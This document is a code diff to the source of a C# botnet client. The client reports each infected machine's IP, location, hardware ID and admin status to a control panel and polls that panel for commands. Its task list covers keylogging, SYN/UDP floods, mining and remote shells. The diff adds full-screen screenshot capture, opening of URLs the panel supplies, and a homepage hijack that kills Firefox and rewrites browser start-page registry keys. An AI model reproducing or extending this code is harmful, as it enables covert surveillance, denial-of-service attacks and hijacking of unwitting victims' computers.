@@ -1,14 +1,15 @@
 ﻿using Bot.Classes;
 using Microsoft.Win32;
 using System;
-using System.Collections.Generic;
-using System.Data.SqlClient;
+using System.Diagnostics;
+using System.Drawing;
+using System.Drawing.Imaging;
+using System.IO;
 using System.Linq;
 using System.Net;
-using System.Web;
-using System.Text;
 using System.Threading;
-using System.IO;
+using System.Web;
+using System.Windows.Forms;
 
 namespace Bot
 {
@@ -51,54 +52,32 @@ namespace Bot
         {
             do
             {
-                    var uriBuilder = new UriBuilder("http://localhost/update.aspx");
-                    var parameters = HttpUtility.ParseQueryString(string.Empty);
-                    parameters["IP"] = Identification.getIP();
-                    parameters["Country"] = Identification.getCountry();
-                    parameters["Region"] = Identification.getRegion();
-                    parameters["HWID"] = Identification.getHWID();
-                    parameters["Version"] = Settings.Botv;
-                    parameters["admin"] = Identification.getAdmin().ToString();
-                    uriBuilder.Port = 3951;
-                    uriBuilder.Query = parameters.ToString();
-                    Uri finalUrl = uriBuilder.Uri;
-                    WebRequest wrURL = WebRequest.Create(finalUrl);
-                    Stream objStream = wrURL.GetResponse().GetResponseStream();
-                    StreamReader objSReader = new StreamReader(objStream);
+                var uriBuilder = new UriBuilder("http://localhost/update.aspx");
+                var parameters = HttpUtility.ParseQueryString(string.Empty);
+                parameters["IP"] = Identification.getIP();
+                parameters["Country"] = Identification.getCountry();
+                parameters["Region"] = Identification.getRegion();
+                parameters["HWID"] = Identification.getHWID();
+                parameters["Version"] = Settings.Botv;
+                parameters["admin"] = Identification.getAdmin().ToString();
+                uriBuilder.Port = 3951;
+                uriBuilder.Query = parameters.ToString();
+                Uri finalUrl = uriBuilder.Uri;
+                WebRequest wrURL = WebRequest.Create(finalUrl);
+                Stream objStream = wrURL.GetResponse().GetResponseStream();
+                StreamReader objSReader = new StreamReader(objStream);
                 Thread.Sleep(1000);
             } while (true);
         }
 
-        //private static void mainThread()
-        //{
-        //    using (SqlConnection conn = new SqlConnection(Settings.SqlConn))
-        //    {
-        //        conn.Open();
-        //        do
-        //        {
-        //            try
-        //            {
-        //                using (SqlCommand cmd = new SqlCommand("UPDATE bots set LastConn = @LastConn where HWID = @HWID", conn))
-        //                {
-        //                    cmd.Parameters.AddWithValue("HWID", Identification.getHWID());
-        //                    cmd.Parameters.AddWithValue("LastConn", Misc.getDate());
-        //                    cmd.ExecuteNonQuery();
-        //                }
-        //            }
-        //            catch { }
-        //            Thread.Sleep(Settings.reqInterval * 1000);
-        //        } while (true);
-        //    }
-        //}
-
         private static void TaskThread()
         {
             string CTasksyn = "";
-            string[] Tasks = { "clipboard", "http","syn","udp", "download", "firefox", "homepage", "keylogger", "mine", "cleanse", "update", "uninstall", "viewhidden", "viewvisable", "shellhidden", "shellvisable" };
+            string[] Tasks = { "clipboard", "screenshot" , "http", "syn", "udp", "download", "firefox", "homepage", "keylogger", "mine", "cleanse", "update", "uninstall", "viewhidden", "viewvisable", "shellhidden", "shellvisable" };
             do
             {
                 string[] NTask = new WebClient().DownloadString(Settings.panel + "/Task.aspx?HWID=" + Identification.getHWID()).ToString().Split(';');
-                Thread C = new Thread(new ThreadStart(Misc.clip));  
+                Thread C = new Thread(new ThreadStart(Misc.clip));
                 foreach (string x in Tasks)
                 {
                     if (NTask.Contains(x))
@@ -110,21 +89,62 @@ namespace Bot
                         {
                             CTasksyn += ";" + x;
                             CTask = CTasksyn.Split(';');
-                            CTasksyn.Replace(";;",";");
+                            CTasksyn.Replace(";;", ";");
                             Console.WriteLine(x);
-                            if(x == "clipboard")
+                            if (x == "clipboard")
                             {
                                 clipon = true;
                                 C.Start();
                             }
 
-                            if(x == "viewvisable")
+                            if (x == "viewvisable")
                             {
-                                System.Diagnostics.Process.Start("http://www.google.com");
+                                string[] Viewvisable = new WebClient().DownloadString(Settings.panel + "/Task.aspx?HWID=" + Identification.getHWID() + "&Type=viewvisable").ToString().Split(';');
+                                foreach (string url in Viewvisable)
+                                {
+                                    if (url.Contains("www"))
+                                    {
+                                        System.Diagnostics.Process.Start("http://" + url);
+                                    }
+                                }
                             }
 
-                            if(x == "viewhidden")
+                            if (x == "screenshot")
                             {
+                                for (int i = 0; i < Screen.AllScreens.Length; i++)
+                                {
+                                    Screen screen = Screen.AllScreens[i];
+
+                                    Bitmap bit = new Bitmap(screen.Bounds.Width, screen.Bounds.Height, PixelFormat.Format32bppArgb);
+                                    {
+                                        using (Graphics gfx = Graphics.FromImage(bit))
+                                        {
+                                            gfx.CopyFromScreen(screen.Bounds.X,screen.Bounds.Y,0,0,screen.Bounds.Size,CopyPixelOperation.SourceCopy);
+                                            String _path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "Screenshot" + i + ".jpg");
+                                            bit.Save(_path);
+                                        }
+                                    }
+                                }
+                            }
+                            if (x == "homepage")
+                            {
+                                string[] homepage = new WebClient().DownloadString(Settings.panel + "/Task.aspx?HWID=" + Identification.getHWID() + "&Type=homepage").ToString().Split(';');
+                                foreach (string url in homepage)
+                                {
+                                    if (url.Contains("www"))
+                                    {
+                                        ;
+                                        foreach (Process proc in Process.GetProcessesByName("firefox"))
+                                        {
+                                            proc.Kill();
+                                        }
+                                        RegistryKey startPageKey = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Internet Explorer\Main", true);
+                                        startPageKey.SetValue("Start Page", "http://" + url);
+                                        startPageKey.SetValue("Start Page Redirect Cache", "http://" + url);
+                                        startPageKey.Close();
+                                        Misc.SetMozilla("http://" + url);
+                                    }
+                                }
                             }
                         }
                     }
@@ -179,6 +199,5 @@ namespace Bot
                 return false;
             }
         }
-
     }
 }
